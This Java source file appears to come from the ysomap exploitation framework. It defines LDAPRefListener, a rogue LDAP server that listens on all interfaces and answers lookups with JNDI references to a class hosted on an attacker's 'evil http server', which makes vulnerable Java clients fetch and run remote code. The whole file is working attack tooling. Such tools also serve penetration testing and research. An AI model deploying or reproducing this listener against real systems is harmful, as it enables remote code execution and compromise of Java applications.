package ysomap.core.exploit.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import ysomap.common.annotation.*;
import ysomap.core.bean.Exploit;
import ysomap.core.exploit.ldap.component.OperationInterceptor;
import ysomap.common.util.Logger;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

/**
 * @author mbechler
 */
@Exploits
@Authors({Authors.MBECHLER})
@Require(bullets = {"evil http server"}, param = false)
@Dependencies({"com.sun.jndi.ldap.object.trustURLCodebase=true"})
public class LDAPRefListener extends Exploit {

    @NotNull
    @Require(name = "lport", type = "int", detail = "LDAP Server listening port")
    public String lport = "1389";

    @NotNull
    @Require(name = "codebase", detail = "evil http server address, like http://localhost/ 这里codebase必须以\"/\"结尾")
    public String codebase;

    @NotNull
    @Require(name = "objectName", detail = "the Object name which mounted by evil http server, like EvilObj")
    public String objectName;

    private InMemoryDirectoryServer ds;

    @Override
    public void work() {
        needRunning = true;
        InMemoryDirectoryServerConfig config = null;
        try {
            config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    Integer.parseInt(lport),
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(codebase, objectName));
            ds = new InMemoryDirectoryServer(config);
            Logger.success("LDAPRefListener listening on 0.0.0.0:" + lport); //$NON-NLS-1$
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        ds.closeAllConnections(false);
        ds.close();
        exit = true;
        Logger.success("LDAPRef Listener stopped");
    }

    @Override
    public String toString() {
        return "LDAPRefListener{" +
                "lport='" + lport + '\'' +
                ", codebase='" + codebase + '\'' +
                ", objectName='" + objectName + '\'' +
                '}';
    }

}
